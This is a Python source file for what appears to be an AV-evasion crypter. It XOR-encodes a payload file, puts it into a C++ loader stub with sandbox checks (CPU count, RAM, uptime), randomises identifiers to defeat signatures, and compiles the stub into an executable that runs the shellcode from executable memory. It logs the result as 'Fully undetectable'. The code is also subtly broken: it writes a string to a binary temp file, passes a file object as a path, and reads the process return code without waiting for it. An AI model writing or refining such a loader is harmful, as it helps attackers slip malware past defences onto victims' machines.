import random
import string
from . import logger
from pathlib import Path
from tempfile import TemporaryFile
from subprocess import Popen


STUB_TEMPLATE = """
#include <windows.h>
#include <stdio.h>
#include <iostream>
#define MULTI_LINE_STRING(a) #a
#pragma comment(linker, "/INCREMENTAL:YES")
#pragma comment(lib, "user32.lib")
#define WIN32_LEAN_AND_MEAN

BOOL {FUNCTION_1}() {
  SYSTEM_INFO {VAR_1};
  MEMORYSTATUSEX {VAR_3};
  DWORD {VAR_2};
  DWORD {VAR_4};
  GetSystemInfo(&{VAR_1});
  {VAR_2} = {VAR_1}.dwNumberOfProcessors;
  if ({VAR_2} < 2) return false;
  {VAR_3}.dwLength = sizeof({VAR_3});
  GlobalMemoryStatusEx(&{VAR_3});
  {VAR_4} = {VAR_3}.ullTotalPhys / 1024 / 1024 / 1024;
  if ({VAR_4} < 2) return false;
  return true;
}

int main(int argc, char** argv)
{
    if ({FUNCTION_1}() == false) {
        return -2;
    }
    else
    {
        ULONGLONG {VAR_5} = GetTickCount() / 1000;
        if ({VAR_5} < 1200) return false;
        {XOR_BUF}
        {XOR_KEY}
        char {VAR_6}[sizeof buf];
        int {VAR_8} = 0;
        for (int i = 0; i < sizeof buf; i++)
        {
            if({VAR_8} == sizeof key -1 ) {VAR_8} = 0;
            {VAR_6}[i] = buf[i] ^ key[{VAR_8}];
            {VAR_8}++;
        }

        void* {VAR_7} = VirtualAlloc(0, sizeof {VAR_6}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy({VAR_7}, {VAR_6}, sizeof {VAR_6});
        ((void(*)()){VAR_7})();
        return 0;
    }
}""".strip()


def get_random_string(length=12):
    return "".join(random.choices(string.ascii_letters, k=length))


def xor_with_key(payload_bytes: str, xor_key: str) -> str:
    """
    Encrypts the input data using the XOR operation with the provided key.

    Args:
        payload_bytes (str): The input string to be encrypted.
        xor_key (str): The encryption key.

    Returns:
        str: The encrypted data in a formatted hexadecimal string.
    """
    if not xor_key:
        raise ValueError("Key cannot be empty.")

    # XOR operation with key, cycling through key characters as needed
    output = [
        chr(ord(char) ^ ord(xor_key[i % len(xor_key)]))
        for i, char in enumerate(payload_bytes)
    ]

    # Generate hexadecimal representation
    ciphertext = (
        "{ " + ", ".join(f"0x{ord(char):02x}" for char in output) + " }"
    )

    return ciphertext


class Builder:
    def __init__(self, payload_file_path: Path):
        if not payload_file_path.exists():
            raise Exception("Payload file not found")

        # TODO: Aciklama
        self.payload: Path = payload_file_path

    def create_template(self): ...

    def obfuscate(self, template: str) -> str:
        """TODO: Aciklama"""
        result = template

        for i in range(1, 9):
            result = result.replace(f"{{VAR_{i}}}", get_random_string())

        result = result.replace("{FUNCTION_1}", get_random_string())

        return result

    def build(self):
        with TemporaryFile() as template_file:
            # TODO: xor_key aciklama
            xor_key = get_random_string()
            with self.payload.open("rb") as payload_file:
                payload_bytes = payload_file.read()

            xor_payload_bytes = xor_with_key(payload_bytes, xor_key)

            template = self.obfuscate(STUB_TEMPLATE)

            xor_payload_bytes = f"unsigned char buf[] = {xor_payload_bytes};"
            formatted_xor_key = f'char key[] = "{xor_key}";'

            # TODO: Obfuscate these variables
            template = template.replace("{XOR_BUF}", xor_payload_bytes)
            template = template.replace("{XOR_KEY}", formatted_xor_key)
            template_file.write(template)

            self.compile(template_file)

    def compile(self, template: Path):
        """
        TODO: Aciklama
        """
        compiled_app_name = f"{get_random_string()}.exe"
        compile_command = f"x86_64-w64-mingw32-g++ -o {compiled_app_name} {template.as_posix()} -static-libstdc++ -static-libgcc"
        try:
            compile_process = Popen(compile_command, shell=True)
            if compile_process.returncode == 0:
                logger.goodt(
                    f"Fully undetectable {compiled_app_name} generated :)"
                )
                print(logger.banner)
        except Exception:
            logger.errort("Failed to compile")
            raise
